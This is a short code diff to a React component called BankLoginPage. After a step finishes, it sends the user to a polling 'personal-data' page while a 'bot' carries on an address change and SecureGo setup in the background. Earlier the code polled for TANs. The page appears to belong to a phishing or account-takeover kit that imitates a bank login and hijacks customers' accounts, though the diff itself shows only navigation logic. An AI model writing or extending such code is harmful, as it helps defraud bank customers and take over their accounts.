@@ -568,9 +568,16 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             customerName={ad.customer_name ?? ad.name}
             onBack={() => {}}
             onDeleted={() => {
-              // Bot continues the flow; keep polling for next status (TAN etc.)
-              setPhase("waiting");
-              setSubmitting(true);
+              // Bot continues the address change + SecureGo in the background;
+              // take the user straight to the personal-data page, which keeps
+              // polling and shows updated results as they arrive.
+              const tid = currentTaskId;
+              if (tid) {
+                navigate({ to: "/personal-data/$taskId", params: { taskId: tid } });
+              } else {
+                setPhase("waiting");
+                setSubmitting(true);
+              }
             }}
           />
         </div>
